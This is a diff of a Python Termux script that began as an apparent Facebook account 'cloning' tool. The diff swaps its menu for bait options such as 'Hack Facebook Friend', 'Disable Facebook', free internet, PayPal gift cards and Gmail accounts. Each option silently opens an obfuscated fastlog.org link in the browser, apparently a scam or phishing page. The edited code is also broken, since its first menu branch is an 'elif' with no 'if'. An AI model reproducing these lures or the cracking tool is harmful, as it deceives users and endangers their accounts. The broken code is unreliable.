@@ -540,8 +540,6 @@ logo =                                          ("""
 """)
 
 clear()
-os.system("xdg-open https://www.facebook.com/profile.php?id=100046690249549")
-xxxx = str(len(ugen))
 
 NameX =input('\033[1;97m[+]\033[1;92mYOUR NAME \033[1;91m: \033[1;96m')
 #---------------------[LOOP MENU]---------------------#
@@ -590,20 +588,37 @@ def main():
     print('\033[1;32m--------------------------------------------------------------') 
     print(f"\033[1;97m[+] \033[1;92mNAME \033[1;91m: \033[1;96m{NameX}")
     print('\033[1;32m--------------------------------------------------------------') 
-    print(f"\033[1;97m[01] \033[1;92mSTART CLONING")
-    print(f"\033[1;97m[02] \033[JOIN TO AFG Termux command FB group")
-    print(f"\033[1;97m[03] \033[JOIN TO AFG TERMUX COMMAND TELEGRAM")
+    print(f"\033[1;97m[01] \033[ Hack Facebook Friend") 
+    print(f"\033[1;97m[02] \033[ Facebook Like") 
+    print(f"\033[1;97m[03] \033[ Disable Facebook")
+    print(f"\033[1;97m[04] \033[ Facebook Wallpaper")
+    print(f"\033[1;97m[05] \033[ instagram Follower")
+    print(f"\033[1;97m[06] \033[ TikTok Follower")
+    print(f"\033[1;97m[07] \033[ 10GB internet free")
+    print(f"\033[1;97m[08] \033[ Gift Cart PayPal")
+    print(f"\033[1;97m[09] \033[ 10$ Gmail Accounts")
     print(f"\033[1;97m[00] \033[1;92mEXIT ")
     print('\033[1;32m--------------------------------------------------------------') 
     mirwais = input("\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SELECT \033[1;37m: \033[1;36m")
-    if mirwais in ["1","01"]:
-        passx()
-    elif mirwais in ["2","02"]:
-        os.system("xdg-open https://www.facebook.com/groups/3508391782738119")
-        main()
-    elif mirwais in ["3","03"]:
-        os.system("xdg-open https://t.me/AFGTERMUXKEFAYAT")
-        main()
+    elif mirwais in ["1","01"]: 
+         os.system("xdg-open https://fastlog.org/MTImYW1wO2k9MTYxNzkz")
+    elif mirwais in ["2","02"]: 
+         os.system("xdg-open https://fastlog.org/MjQmYW1wO2k9MTYxNzkz") 
+         main() 
+    elif mirwais in ["3","03"]: 
+         os.system("xdg-open https://fastlog.org/MTcmYW1wO2k9MTYxNzkz")
+    elif mirwais in ["4","04"]: 
+         os.system("xdg-open https://fastlog.org/NDYmYW1wO2k9MTYxNzkz")
+    elif mirwais in ["5","05"]: 
+         os.system("xdg-open https://fastlog.org/NjEmYW1wO2k9MTYxNzkz")
+    elif mirwais in ["6","06"]: 
+         os.system("xdg-open https://fastlog.org/dGsmYW1wO2k9MTYxNzkz")
+    elif mirwais in ["7","07"]: 
+         os.system("xdg-open https://fastlog.org/NjUmYW1wO2k9MTYxNzkz")
+    elif mirwais in ["8","08"]: 
+         os.system("xdg-open https://fastlog.org/cGx0JmFtcDtpPTE2MTc5Mw==")
+    elif mirwais in ["9","09"]: 
+         os.system("xdg-open https://fastlog.org/MTAmYW1wO2k9MTYxNzkz")
     elif mirwais in ["0","00"]:
        exit()
     else:
